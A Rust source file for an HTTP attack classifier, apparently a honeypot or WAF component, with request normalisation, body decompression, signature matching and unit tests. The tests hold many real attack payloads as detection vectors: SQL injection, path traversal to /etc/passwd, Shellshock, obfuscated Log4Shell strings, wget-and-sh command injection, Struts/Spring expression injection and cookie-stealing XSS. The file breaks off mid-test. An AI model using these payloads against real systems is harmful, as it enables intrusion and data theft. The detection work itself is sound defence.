pub mod rules;

use anyhow::Result;
use regex::Regex;
use std::borrow::Cow;
use std::io::Read;
use std::path::Path;

#[derive(Debug)]
pub struct RequestView<'a> {
    pub method: &'a str,
    pub path: &'a str,
    pub query: Option<&'a str>,
    pub headers: Vec<(String, String)>,
    pub body: Option<&'a [u8]>,
    /// Host of an absolute-form request target (`GET http://host/ HTTP/1.1`):
    /// the client treats this server as a forward proxy.
    pub proxy_target: Option<&'a str>,
}

/// What the IP did in the last hour, the current request included.
#[derive(Debug, Default, Clone)]
pub struct IpHistory {
    pub distinct_paths_1h: u32,
    pub requests_1h: u32,
}

#[derive(Debug, Default, Clone)]
pub struct BotTells {
    pub webdriver: bool,
    pub inhuman_fill: bool,
}

#[derive(Debug, Clone, PartialEq)]
pub struct Verdict {
    pub severity: u8,
    pub scan_level: u8,
    pub labels: Vec<String>,
    pub owasp: Vec<String>,
}

struct CompiledRule {
    label: String,
    weight: u8,
    /// Restricts the rule to these methods (exact, as sent).
    methods: Option<Vec<String>>,
    target: Option<Regex>,
    body: Option<Regex>,
    ua: Option<Regex>,
    header: Option<Regex>,
    path_exact: Option<String>,
    owasp: Vec<String>,
}

/// Decode a request target or body for matching: up to two passes of
/// percent-decoding (so `%252e` → `%2e` → `.`), IIS `%uXXXX` escapes, `+` as
/// a space, and overlong UTF-8 forms of ASCII (`%c0%ae`, `%e0%80%ae` → `.`,
/// `%c1%1c` → `\`) that old servers accepted as path characters. Invalid
/// escapes and bytes pass through unchanged. Rules are matched against both
/// the raw and the decoded text, so signatures written against either form
/// still fire.
pub(crate) fn normalize(s: &str) -> String {
    normalize_bytes(s.as_bytes())
}

/// [`normalize`] on raw bytes (a body may carry overlong sequences as is).
pub(crate) fn normalize_bytes(b: &[u8]) -> String {
    let mut cur = fold_overlong(b);
    for _ in 0..2 {
        let next = fold_overlong(&percent_decode_once(&cur));
        if next == cur {
            break;
        }
        cur = next;
    }
    String::from_utf8_lossy(&cur).into_owned()
}

fn hex(c: u8) -> Option<u8> {
    match c {
        b'0'..=b'9' => Some(c - b'0'),
        b'a'..=b'f' => Some(c - b'a' + 10),
        b'A'..=b'F' => Some(c - b'A' + 10),
        _ => None,
    }
}

fn percent_decode_once(b: &[u8]) -> Vec<u8> {
    let mut out: Vec<u8> = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'%' {
            // IIS: %uXXXX is the UTF-16 code unit XXXX.
            if i + 5 < b.len()
                && (b[i + 1] | 0x20) == b'u'
                && let Some(c) = b[i + 2..i + 6]
                    .iter()
                    .try_fold(0u32, |acc, &c| hex(c).map(|h| acc * 16 + h as u32))
                    .and_then(char::from_u32)
            {
                let mut buf = [0u8; 4];
                out.extend_from_slice(c.encode_utf8(&mut buf).as_bytes());
                i += 6;
                continue;
            }
            if i + 2 < b.len()
                && let (Some(h), Some(l)) = (hex(b[i + 1]), hex(b[i + 2]))
            {
                out.push(h * 16 + l);
                i += 3;
                continue;
            }
        }
        out.push(if b[i] == b'+' { b' ' } else { b[i] });
        i += 1;
    }
    out
}

/// Replace overlong UTF-8 encodings of ASCII characters with the character.
/// `C0`/`C1` lead bytes are never valid UTF-8; IIS ignored the top bits of
/// their second byte, so any second byte is accepted for them.
fn fold_overlong(b: &[u8]) -> Vec<u8> {
    let cont = |c: u8| c & 0xC0 == 0x80;
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        let c = b[i];
        if (c == 0xC0 || c == 0xC1) && i + 1 < b.len() {
            out.push(((c & 0x01) << 6) | (b[i + 1] & 0x3F));
            i += 2;
            continue;
        }
        if c == 0xE0 && i + 2 < b.len() && b[i + 1] & 0xFE == 0x80 && cont(b[i + 2]) {
            out.push(((b[i + 1] & 0x01) << 6) | (b[i + 2] & 0x3F));
            i += 3;
            continue;
        }
        if c == 0xF0
            && i + 3 < b.len()
            && b[i + 1] == 0x80
            && b[i + 2] & 0xFE == 0x80
            && cont(b[i + 3])
        {
            out.push(((b[i + 2] & 0x01) << 6) | (b[i + 3] & 0x3F));
            i += 4;
            continue;
        }
        out.push(c);
        i += 1;
    }
    out
}

/// Most decompressed bytes classified from a `Content-Encoding` body; a
/// small compressed body cannot expand past this (decompression bomb).
pub const MAX_DECODED_BODY: u64 = 256 * 1024;

/// The body as the application would see it: a gzip or deflate
/// `Content-Encoding` is undone (up to [`MAX_DECODED_BODY`] bytes), so a
/// compressed payload matches the same rules. Anything that does not decode
/// is classified as sent.
pub fn decoded_body<'a>(headers: &[(String, String)], body: &'a [u8]) -> Cow<'a, [u8]> {
    let enc = headers
        .iter()
        .find(|(k, _)| k.eq_ignore_ascii_case("content-encoding"))
        .map(|(_, v)| v.trim().to_ascii_lowercase());
    let inflate = |r: &mut dyn Read| {
        let mut out = Vec::new();
        // A truncated stream still yields what was decoded before the cut.
        let res = r.take(MAX_DECODED_BODY).read_to_end(&mut out);
        (res.is_ok() || !out.is_empty()).then_some(out)
    };
    let out = match enc.as_deref() {
        Some("gzip" | "x-gzip") => inflate(&mut flate2::read::GzDecoder::new(body)),
        // Officially zlib-wrapped; some clients send raw deflate.
        Some("deflate") => inflate(&mut flate2::read::ZlibDecoder::new(body))
            .or_else(|| inflate(&mut flate2::read::DeflateDecoder::new(body))),
        _ => None,
    };
    match out {
        Some(o) if !o.is_empty() => Cow::Owned(o),
        _ => Cow::Borrowed(body),
    }
}

pub struct Classifier {
    rules: Vec<CompiledRule>,
}

impl Classifier {
    /// Number of compiled signature rules.
    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }

    pub fn from_dir(dir: &Path) -> Result<Self> {
        let rules = rules::load_dir(dir)?
            .into_iter()
            .map(|r| {
                Ok(CompiledRule {
                    label: r.label,
                    weight: r.weight,
                    methods: r.methods,
                    target: r.target_regex.as_deref().map(compile_ci).transpose()?,
                    body: r.body_regex.as_deref().map(compile_ci).transpose()?,
                    ua: r.ua_regex.as_deref().map(compile_ci).transpose()?,
                    header: r.header_regex.as_deref().map(compile_ci).transpose()?,
                    path_exact: r.path_exact,
                    owasp: r.owasp.unwrap_or_default(),
                })
            })
            .collect::<Result<Vec<_>>>()?;
        Ok(Self { rules })
    }

    pub fn classify(&self, req: &RequestView, hist: &IpHistory, bot: &BotTells) -> Verdict {
        let mut labels: Vec<String> = vec![];
        let mut owasp: Vec<String> = vec![];
        let mut weight: u8 = 0;

        let target = match req.query {
            Some(q) => format!("{}?{}", req.path, q),
            None => req.path.to_string(),
        };
        let target_dec = normalize(&target);
        let ua = req
            .headers
            .iter()
            .find(|(k, _)| k.eq_ignore_ascii_case("user-agent"))
            .map(|(_, v)| v.as_str())
            .unwrap_or("");
        let body = req
            .body
            .map(|b| String::from_utf8_lossy(b).into_owned())
            .unwrap_or_default();
        let body_dec = req.body.map(normalize_bytes).unwrap_or_default();
        // Every header as "name: value", for rules that inspect headers other
        // than User-Agent (Shellshock, Log4Shell, …).
        let headers_joined = req
            .headers
            .iter()
            .map(|(k, v)| format!("{k}: {v}"))
            .collect::<Vec<_>>()
            .join("\n");
        let headers_dec = normalize(&headers_joined);
        let matches_any = |re: &Regex, raw: &str, dec: &str| re.is_match(raw) || re.is_match(dec);

        for r in &self.rules {
            if r.methods
                .as_ref()
                .is_some_and(|m| !m.iter().any(|x| x == req.method))
            {
                continue;
            }
            let has_matcher = r.path_exact.is_some()
                || r.target.is_some()
                || r.body.is_some()
                || r.ua.is_some()
                || r.header.is_some();
            // A rule with only `methods` matches on the method alone.
            let hit = !has_matcher
                || r.path_exact.as_deref() == Some(req.path)
                || r.target
                    .as_ref()
                    .is_some_and(|re| matches_any(re, &target, &target_dec))
                || r.body
                    .as_ref()
                    .is_some_and(|re| !body.is_empty() && matches_any(re, &body, &body_dec))
                || r.ua.as_ref().is_some_and(|re| re.is_match(ua))
                || r.header.as_ref().is_some_and(|re| {
                    !headers_joined.is_empty() && matches_any(re, &headers_joined, &headers_dec)
                });
            if hit {
                labels.push(r.label.clone());
                owasp.extend(r.owasp.iter().cloned());
                weight = weight.max(r.weight);
            }
        }

        // Behavioral ladder (spec §6).
        if hist.distinct_paths_1h >= 10 || hist.requests_1h >= 20 {
            labels.push("path-scanner".into());
            weight = weight.max(2);
        } else if labels.is_empty() {
            labels.push("probe".into());
            weight = weight.max(1);
        }
        // Methods are case-sensitive: `get` is not GET.
        match req.method {
            "GET" | "HEAD" | "OPTIONS" => {}
            "POST" => {
                labels.push("form-interaction".into());
                weight = weight.max(3);
            }
            // Attempts to change what the server holds (WebDAV uploads,
            // REST writes): as serious as submitting a form.
            "PUT" | "PATCH" | "DELETE" => {
                labels.push("write-method".into());
                weight = weight.max(3);
            }
            "CONNECT" => {
                labels.push("proxy-probe".into());
                weight = weight.max(2);
            }
            // TRACE, PROPFIND, DEBUG, made-up verbs: server fingerprinting.
            _ => {
                labels.push("unusual-method".into());
                weight = weight.max(2);
            }
        }
        if req.proxy_target.is_some() {
            labels.push("proxy-probe".into());
            weight = weight.max(2);
        }
        if bot.webdriver {
            labels.push("automation".into());
            weight = weight.max(2);
        }
        if bot.inhuman_fill {
            labels.push("inhuman-behavior".into());
            weight = weight.max(3);
        }

        labels.sort();
        labels.dedup();
        owasp.sort();
        owasp.dedup();
        let scan_level = weight.min(4);
        Verdict {
            severity: weight,
            scan_level,
            labels,
            owasp,
        }
    }
}

fn compile_ci(pattern: &str) -> Result<Regex> {
    Ok(Regex::new(&format!("(?i){pattern}"))?)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn classifier() -> Classifier {
        Classifier::from_dir(std::path::Path::new("rules")).unwrap()
    }
    fn view<'a>(
        method: &'a str,
        path: &'a str,
        query: Option<&'a str>,
        ua: &'a str,
        body: Option<&'a [u8]>,
    ) -> RequestView<'a> {
        RequestView {
            method,
            path,
            query,
            headers: vec![("user-agent".into(), ua.into())],
            body,
            proxy_target: None,
        }
    }
    fn hist(paths: u32, reqs: u32) -> IpHistory {
        IpHistory {
            distinct_paths_1h: paths,
            requests_1h: reqs,
        }
    }

    #[test]
    fn hit_rules_contribute_owasp_tags() {
        let v = classifier().classify(
            &view(
                "GET",
                "/login",
                Some("id=1%27%20OR%201%3D1--"),
                "curl/8",
                None,
            ),
            &hist(1, 1),
            &BotTells::default(),
        );
        assert!(v.labels.iter().any(|l| l == "sqli"), "{:?}", v.labels);
        assert_eq!(v.owasp, vec!["A03:2021".to_string()]);
        // A request hitting no signature rule has no tags.
        let plain = classifier().classify(
            &view("GET", "/nonexistent", None, "Mozilla/5.0", None),
            &hist(1, 1),
            &BotTells::default(),
        );
        assert!(plain.owasp.is_empty(), "{:?}", plain.owasp);
    }

    #[test]
    fn single_plain_probe_is_level_1() {
        let v = classifier().classify(
            &view("GET", "/nonexistent", None, "Mozilla/5.0", None),
            &hist(1, 1),
            &BotTells::default(),
        );
        assert_eq!(v.scan_level, 1);
        assert!(v.labels.contains(&"probe".to_string()));
    }

    #[test]
    fn repeated_scanning_is_level_2() {
        let v = classifier().classify(
            &view("GET", "/a", None, "Mozilla/5.0", None),
            &hist(15, 20),
            &BotTells::default(),
        );
        assert_eq!(v.scan_level, 2);
        assert!(v.labels.contains(&"path-scanner".to_string()));
    }

    #[test]
    fn scanner_user_agent_is_level_2() {
        let v = classifier().classify(
            &view("GET", "/", None, "sqlmap/1.7.11", None),
            &hist(1, 1),
            &BotTells::default(),
        );
        assert_eq!(v.scan_level, 2);
        assert!(v.labels.contains(&"scanner-ua".to_string()));
    }

    #[test]
    fn sqli_in_query_is_level_4() {
        let v = classifier().classify(
            &view(
                "GET",
                "/login",
                Some("user=admin'%20OR%20'1'='1"),
                "Mozilla/5.0",
                None,
            ),
            &hist(1, 1),
            &BotTells::default(),
        );
        assert_eq!(v.scan_level, 4);
        assert!(v.labels.iter().any(|l| l == "sqli"));
    }

    #[test]
    fn bait_form_post_is_at_least_level_3() {
        let v = classifier().classify(
            &view(
                "POST",
                "/login",
                None,
                "Mozilla/5.0",
                Some(b"username=a&password=b"),
            ),
            &hist(2, 3),
            &BotTells::default(),
        );
        assert!(v.scan_level >= 3);
        assert!(v.labels.contains(&"form-interaction".to_string()));
    }

    #[test]
    fn sensitive_path_label() {
        let v = classifier().classify(
            &view("GET", "/.env", None, "curl/8.0", None),
            &hist(1, 1),
            &BotTells::default(),
        );
        assert!(v.labels.contains(&"sensitive-path".to_string()));
        assert!(v.scan_level >= 2);
    }

    #[test]
    fn fully_encoded_sqli_is_decoded_and_caught() {
        // %27%20OR%201%3D1-- — fully percent-encoded, misses without decoding.
        let v = classifier().classify(
            &view(
                "GET",
                "/login",
                Some("id=1%27%20OR%201%3D1--"),
                "curl/8",
                None,
            ),
            &hist(1, 1),
            &BotTells::default(),
        );
        assert!(v.labels.iter().any(|l| l == "sqli"), "{:?}", v.labels);
    }

    #[test]
    fn double_encoded_and_backslash_traversal_is_caught() {
        for q in ["f=..%252f..%252fetc/passwd", "f=..%5c..%5cwin.ini"] {
            let v = classifier().classify(
                &view("GET", "/x", Some(q), "curl/8", None),
                &hist(1, 1),
                &BotTells::default(),
            );
            assert!(
                v.labels.iter().any(|l| l == "path-traversal"),
                "{q}: {:?}",
                v.labels
            );
        }
    }

    #[test]
    fn log4shell_and_shellshock_in_headers_are_caught() {
        let shell = RequestView {
            method: "GET",
            path: "/",
            query: None,
            headers: vec![("user-agent".into(), "() { :;}; /bin/bash -c id".into())],
            body: None,
            proxy_target: None,
        };
        assert!(
            classifier()
                .classify(&shell, &hist(1, 1), &BotTells::default())
                .labels
                .iter()
                .any(|l| l == "rce")
        );
        let jndi = RequestView {
            method: "GET",
            path: "/",
            query: None,
            headers: vec![("x-api-version".into(), "${jndi:ldap://evil/a}".into())],
            body: None,
            proxy_target: None,
        };
        assert!(
            classifier()
                .classify(&jndi, &hist(1, 1), &BotTells::default())
                .labels
                .iter()
                .any(|l| l == "rce")
        );
    }

    #[test]
    fn english_apostrophe_body_is_not_sqli() {
        // "users' and admins" must not be flagged as SQLi.
        let v = classifier().classify(
            &view(
                "POST",
                "/comment",
                None,
                "Mozilla/5.0",
                Some(b"text=users%27+and+admins+agree"),
            ),
            &hist(1, 1),
            &BotTells::default(),
        );
        assert!(!v.labels.iter().any(|l| l == "sqli"), "{:?}", v.labels);
    }

    #[test]
    fn well_known_is_not_sensitive() {
        for p in ["/.well-known/acme-challenge/x", "/.well-known/security.txt"] {
            let v = classifier().classify(
                &view("GET", p, None, "Mozilla/5.0", None),
                &hist(1, 1),
                &BotTells::default(),
            );
            assert!(
                !v.labels.iter().any(|l| l == "sensitive-path"),
                "{p}: {:?}",
                v.labels
            );
        }
    }

    #[test]
    fn id_substring_is_not_rce() {
        // ";idx=" must not match the ";id" command-injection signature.
        let v = classifier().classify(
            &view("GET", "/p", Some("a=1;idx=2"), "Mozilla/5.0", None),
            &hist(1, 1),
            &BotTells::default(),
        );
        assert!(!v.labels.iter().any(|l| l == "rce"), "{:?}", v.labels);
    }

    #[test]
    fn webdriver_escalates() {
        let bot = BotTells {
            webdriver: true,
            inhuman_fill: false,
        };
        let v = classifier().classify(
            &view("GET", "/x", None, "Mozilla/5.0", None),
            &hist(1, 1),
            &bot,
        );
        assert!(v.scan_level >= 2);
        assert!(v.labels.contains(&"automation".to_string()));
    }

    /// Labels for a request; `target` is `path` or `path?query`.
    fn labels_of(
        c: &Classifier,
        method: &str,
        target: &str,
        headers: &[(&str, &str)],
        body: Option<&[u8]>,
    ) -> Vec<String> {
        let (path, query) = match target.split_once('?') {
            Some((p, q)) => (p, Some(q)),
            None => (target, None),
        };
        let req = RequestView {
            method,
            path,
            query,
            headers: headers
                .iter()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect(),
            body,
            proxy_target: None,
        };
        c.classify(&req, &hist(1, 1), &BotTells::default()).labels
    }

    /// Each probe gets its label; each benign request does not.
    fn check(c: &Classifier, label: &str, probes: &[&str], benign: &[&str]) {
        for t in probes {
            let l = labels_of(c, "GET", t, &[], None);
            assert!(l.iter().any(|x| x == label), "{t} should be {label}: {l:?}");
        }
        for t in benign {
            let l = labels_of(c, "GET", t, &[], None);
            assert!(
                !l.iter().any(|x| x == label),
                "{t} must not be {label}: {l:?}"
            );
        }
    }

    #[test]
    fn dotfiles_with_a_query_string_are_sensitive() {
        check(
            &classifier(),
            "sensitive-path",
            &[
                "/.env?x=1",
                "/.git?x",
                "/.git/config?a",
                "/.env",
                "/api/.env.bak",
                "/.vscode/sftp.json",
                "/server-status",
                "/server-status?auto",
                "/phpinfo.php",
                "/info.php?a=1",
                "/manager/html",
                "/host-manager/html",
            ],
            &[
                "/.environment",
                "/envoy",
                "/server-statuses",
                "/blog/phpinfo-explained",
                "/manager/htmlfoo",
                "/vscode-tips",
            ],
        );
    }

    #[test]
    fn union_select_variants_are_sqli() {
        let c = classifier();
        check(
            &c,
            "sqli",
            &[
                "/x?id=1 UNION ALL SELECT 1,2",
                "/x?id=1+union+all+select+null",
                "/x?id=1%20UNION%20DISTINCT%20SELECT%201",
                "/x?id=1/**/union/**/select/**/1",
                "/x?id=1%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%201",
                "/x?id=1 /*!50000union*/ /*!50000select*/ 1",
            ],
            &["/news/trade-union-selection", "/union?select"],
        );
        for body in [
            &b"id=1 UNION ALL SELECT password FROM users"[..],
            b"id=1/**/union/**/select/**/1",
            b"q=1+union+all+select+1",
        ] {
            let l = labels_of(&c, "POST", "/x", &[], Some(body));
            assert!(l.iter().any(|x| x == "sqli"), "{body:?}: {l:?}");
        }
        let l = labels_of(
            &c,
            "POST",
            "/x",
            &[],
            Some(b"text=the union selected a new chair"),
        );
        assert!(!l.iter().any(|x| x == "sqli"), "{l:?}");
    }

    #[test]
    fn obfuscated_log4shell_is_caught_in_headers_url_and_body() {
        let c = classifier();
        let payloads = [
            "${jndi:ldap://x/a}",
            "${${::-j}${::-n}di:ldap://x/a}",
            "${${lower:j}ndi:ldap://x/a}",
            "${j${::-n}di:dns://x}",
            "${${env:NaN:-j}ndi${env:NaN:-:}ldap://x}",
            "${jn${lower:d}i:rmi://x}",
        ];
        for p in payloads {
            let h = labels_of(&c, "GET", "/", &[("x-api-version", p)], None);
            assert!(h.iter().any(|x| x == "rce"), "header {p}: {h:?}");
            let t = labels_of(&c, "GET", &format!("/?q={p}"), &[], None);
            assert!(t.iter().any(|x| x == "rce"), "url {p}: {t:?}");
            let body = format!("{{\"user\":\"{p}\"}}");
            let b = labels_of(&c, "POST", "/login", &[], Some(body.as_bytes()));
            assert!(b.iter().any(|x| x == "rce"), "body {p}: {b:?}");
        }
        // Percent-encoded in the URL.
        let t = labels_of(&c, "GET", "/?q=%24%7Bjndi%3Aldap%3A%2F%2Fx%7D", &[], None);
        assert!(t.iter().any(|x| x == "rce"), "{t:?}");
        // Ordinary template-looking text is not.
        let b = labels_of(&c, "POST", "/x", &[], Some(b"price=${amount} total"));
        assert!(!b.iter().any(|x| x == "rce"), "{b:?}");
    }

    #[test]
    fn interpreter_names_need_injection_context() {
        let c = classifier();
        check(
            &c,
            "rce",
            &[
                "/x?cmd=;/bin/sh -c id",
                "/x?c=$(/bin/bash)",
                "/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh",
                "/x?run=cmd.exe /c dir",
                "/x?run=cmd /c whoami",
                "/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir",
                "/x?a=|powershell -enc AAAA",
                "/x?a=powershell.exe",
            ],
            &[
                "/learn-powershell",
                "/blog/powershell-tips",
                "/docs/powershell",
                "/cgi-bin/shop.cgi",
                "/what-is-cmd.exe-for",
                "/bin/shelf",
            ],
        );
        let body = labels_of(&c, "POST", "/x", &[], Some(b"note=learn powershell today"));
        assert!(!body.iter().any(|x| x == "rce"), "{body:?}");
        let body = labels_of(
            &c,
            "POST",
            "/GponForm/diag_Form?images/",
            &[],
            Some(b"XWebPageName=diag&diag_action=ping&dest_host=`busybox wget http://x/a`;sh"),
        );
        assert!(body.iter().any(|x| x == "rce"), "{body:?}");
    }

    #[test]
    fn exploit_endpoints_and_expression_injection_are_rce() {
        let c = classifier();
        check(
            &c,
            "rce",
            &[
                "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                "/_ignition/execute-solution",
                "/mgmt/tm/util/bash",
                "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp",
                "/GponForm/diag_Form?images/",
                "/boaform/admin/formPing",
                "/x?class.module.classLoader.resources.context.parent.pipeline.first.pattern=a",
                "/%24%7B%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29%29%7D/",
                "/index.action?redirect:%25%7B%28%23_memberAccess%29%7D",
            ],
            &[
                "/phpunit/docs",
                "/_ignition/healthy",
                "/mgmt/dashboard",
                "/classes/module/loader",
                "/x?color=%23fff",
            ],
        );
        let spring = labels_of(
            &c,
            "POST",
            "/functionRouter",
            &[(
                "spring.cloud.function.routing-expression",
                "T(java.lang.Runtime).getRuntime().exec(\"id\")",
            )],
            Some(b"x"),
        );
        assert!(spring.iter().any(|x| x == "rce"), "{spring:?}");
        let s2_045 = labels_of(
            &c,
            "GET",
            "/upload.action",
            &[("content-type", "%{(#_='multipart/form-data').(#cmd='id')}")],
            None,
        );
        assert!(s2_045.iter().any(|x| x == "rce"), "{s2_045:?}");
        let body = labels_of(
            &c,
            "POST",
            "/x",
            &[],
            Some(b"class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"),
        );
        assert!(body.iter().any(|x| x == "rce"), "{body:?}");
    }

    #[test]
    fn appliance_and_router_probes_are_labelled() {
        let c = classifier();
        check(
            &c,
            "appliance-probe",
            &[
                "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
                "/remote/logincheck",
                "/dana-na/auth/url_default/welcome.cgi",
                "/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection",
                "/global-protect/login.esp",
                "/+CSCOE+/logon.html",
                "/%2BCSCOE%2B/logon.html",
                "/vpn/../vpns/cgi-bin/newbm.pl",
                "/vpn/index.html",
                "/autodiscover/autodiscover.json?@zdi/Powershell",
                "/owa/auth/logon.aspx",
                "/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application",
            ],
            &[
                "/remote-work",
                "/remote/jobs",
                "/vpn-setup",
                "/openvpn/guide",
                "/owasp",
                "/blog/owa/notes",
                "/global-protection",
            ],
        );
        check(
            &c,
            "iot-probe",
            &[
                "/HNAP1/",
                "/HNAP1",
                "/boaform/admin/formLogin",
                "/GponForm/diag_Form?images/",
            ],
            &["/hnap1-docs", "/boa/form", "/gpon"],
        );
    }

    #[test]
    fn new_scanner_user_agents_are_recognised() {
        let c = classifier();
        for ua in [
            "Fuzz Faster U Fool v2.1.0-dev",
            "ffuf/2.0",
            "feroxbuster/2.10.0",
            "Wfuzz/3.1.0",
            "dirb",
            "httpx - Open-source project (github.com/projectdiscovery/httpx)",
        ] {
            let l = labels_of(&c, "GET", "/", &[("user-agent", ua)], None);
            assert!(l.iter().any(|x| x == "scanner-ua"), "{ua}: {l:?}");
        }
        // Research scanners carry their own label since the scanners split.
        for ua in [
            "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)",
            "Expanse, a Palo Alto Networks company, searches across the global IPv4 space",
            "l9explore/1.2.2",
        ] {
            let l = labels_of(&c, "GET", "/", &[("user-agent", ua)], None);
            assert!(l.iter().any(|x| x == "research-scanner"), "{ua}: {l:?}");
        }
        for ua in [
            "python-httpx/0.27.0",
            "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0",
            "dirbike/1",
        ] {
            let l = labels_of(&c, "GET", "/", &[("user-agent", ua)], None);
            assert!(!l.iter().any(|x| x == "scanner-ua"), "{ua}: {l:?}");
        }
    }

    #[test]
    fn xss_in_body_is_caught() {
        let c = classifier();
        for body in [
            &b"comment=<script>alert(1)</script>"[..],
            b"comment=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
            b"url=javascript:alert(document.cookie)",
        ] {
            let l = labels_of(&c, "POST", "/c", &[], Some(body));
            assert!(l.iter().any(|x| x == "xss"), "{body:?}: {l:?}");
        }
        let l = labels_of(
            &c,
            "POST",
            "/c",
            &[],
            Some(b"text=javascript: the good parts, onload = later"),
        );
        assert!(!l.iter().any(|x| x == "xss"), "{l:?}");
    }

    #[test]
    fn methods_are_weighted() {
        let c = classifier();
        let level = |m: &str| {
            let l = labels_of(&c, m, "/x", &[], None);
            (
                l,
                c.classify(
                    &RequestView {
                        method: m,
                        path: "/x",
                        query: None,
                        headers: vec![],
                        body: None,
                        proxy_target: None,
                    },
                    &hist(1, 1),
                    &BotTells::default(),
                ),
            )
        };
        for m in ["PUT", "PATCH", "DELETE"] {
            let (l, v) = level(m);
            assert!(l.contains(&"write-method".to_string()), "{m}: {l:?}");
            assert_eq!(v.scan_level, 3, "{m}");
        }
        for m in ["PROPFIND", "TRACE", "DEBUG", "get"] {
            let (l, v) = level(m);
            assert!(l.contains(&"unusual-method".to_string()), "{m}: {l:?}");
            assert_eq!(v.scan_level, 2, "{m}");
        }
        let (l, _) = level("CONNECT");
        assert!(l.contains(&"proxy-probe".to_string()), "{l:?}");
        for m in ["GET", "HEAD", "OPTIONS"] {
            let (l, v) = level(m);
            assert_eq!(l, ["probe"], "{m}");
            assert_eq!(v.scan_level, 1, "{m}");
        }
        // An absolute-form target (open-proxy probe).
        let v = c.classify(
            &RequestView {
                method: "GET",
                path: "/",
                query: None,
                headers: vec![],
                body: None,
                proxy_target: Some("example.com:80"),
            },
            &hist(1, 1),
            &BotTells::default(),
        );
        assert!(v.labels.contains(&"proxy-probe".to_string()), "{v:?}");
    }

    #[test]
    fn rules_can_match_on_method() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("m.toml"),
            "[[rule]]\nlabel = \"jsp-upload\"\nweight = 4\nmethods = [\"PUT\"]\ntarget_regex = \"\\\\.jsp/?$\"\n\
             [[rule]]\nlabel = \"webdav\"\nweight = 2\nmethods = [\"PROPFIND\", \"MKCOL\"]\n",
        )
        .unwrap();
        let c = Classifier::from_dir(dir.path()).unwrap();
        assert!(labels_of(&c, "PUT", "/shell.jsp/", &[], None).contains(&"jsp-upload".into()));
        assert!(!labels_of(&c, "GET", "/shell.jsp/", &[], None).contains(&"jsp-upload".into()));
        assert!(!labels_of(&c, "PUT", "/a.txt", &[], None).contains(&"jsp-upload".into()));
        assert!(labels_of(&c, "PROPFIND", "/", &[], None).contains(&"webdav".into()));
        assert!(labels_of(&c, "MKCOL", "/d", &[], None).contains(&"webdav".into()));
        assert!(!labels_of(&c, "GET", "/", &[], None).contains(&"webdav".into()));
    }

    #[test]
    fn normalize_decodes_overlong_utf8_and_iis_unicode() {
        assert_eq!(normalize("/%c0%ae%c0%ae/etc"), "/../etc");
        assert_eq!(normalize("/%e0%80%ae%e0%80%ae%c0%af"), "/../");
        assert_eq!(normalize("/..%c1%1c..%c1%9c"), "/..\\..\\");
        assert_eq!(normalize("/%u002e%u002e%u2215x"), "/..\u{2215}x");
        assert_eq!(normalize("/%U002E"), "/.");
        // Double-encoded overlong.
        assert_eq!(normalize("/%25c0%25ae%25c0%25ae/"), "/../");
        // Incomplete escapes pass through.
        assert_eq!(normalize("/%u00"), "/%u00");
        assert_eq!(normalize("/100%"), "/100%");
        // Ordinary UTF-8 is untouched.
        assert_eq!(normalize("/caf%C3%A9"), "/café");
        let c = classifier();
        for t in [
            "/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts",
            "/%e0%80%ae%e0%80%ae/x",
            "/x?f=%u002e%u002e%u2215%u002e%u002e/x",
            "/x?f=%u002e%u002e/%u002e%u002e/x",
        ] {
            let l = labels_of(&c, "GET", t, &[], None);
            assert!(l.iter().any(|x| x == "path-traversal"), "{t}: {l:?}");
        }
    }

    #[test]
    fn compressed_bodies_are_classified_decoded() {
        use std::io::Write;
        let payload = b"cmd=;id;wget http://x/a|sh&q=1 union select 1";
        let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        gz.write_all(payload).unwrap();
        let gz = gz.finish().unwrap();
        let mut zl = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
        zl.write_all(payload).unwrap();
        let zl = zl.finish().unwrap();
        let mut raw =
            flate2::write::DeflateEncoder::new(Vec::new(), flate2::Compression::default());
        raw.write_all(payload).unwrap();
        let raw = raw.finish().unwrap();
        let c = classifier();
        for (enc, body) in [("gzip", &gz), ("deflate", &zl), ("deflate", &raw)] {
            let h = vec![("content-encoding".to_string(), enc.to_string())];
            let decoded = decoded_body(&h, body);
            assert_eq!(&decoded[..], &payload[..], "{enc}");
            let l = labels_of(
                &c,
                "POST",
                "/x",
                &[("content-encoding", enc)],
                Some(&decoded),
            );
            assert!(l.iter().any(|x| x == "sqli"), "{enc}: {l:?}");
        }
        // Not actually compressed: classified as sent.
        let h = vec![("content-encoding".to_string(), "gzip".to_string())];
        assert_eq!(&decoded_body(&h, b"plain")[..], b"plain");
        // No encoding: untouched.
        assert_eq!(&decoded_body(&[], &gz)[..], &gz[..]);
        // A bomb stops at the cap.
        let mut bomb = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::best());
        bomb.write_all(&vec![b'a'; 4 * 1024 * 1024]).unwrap();
        let bomb = bomb.finish().unwrap();
        assert_eq!(decoded_body(&h, &bomb).len() as u64, MAX_DECODED_BODY);
    }

    #[test]
    fn sqli_additions_are_caught() {
        for q in [
            "id=1;waitfor%20delay%20'0:0:5'",
            "id=1%20or%20pg_sleep(5)--",
            "id=1%20union%20select%20load_file('/etc/passwd')",
            "id=1;exec%20xp_cmdshell%20'whoami'",
        ] {
            let v = classifier().classify(
                &view("GET", "/item", Some(q), "curl/8", None),
                &hist(1, 1),
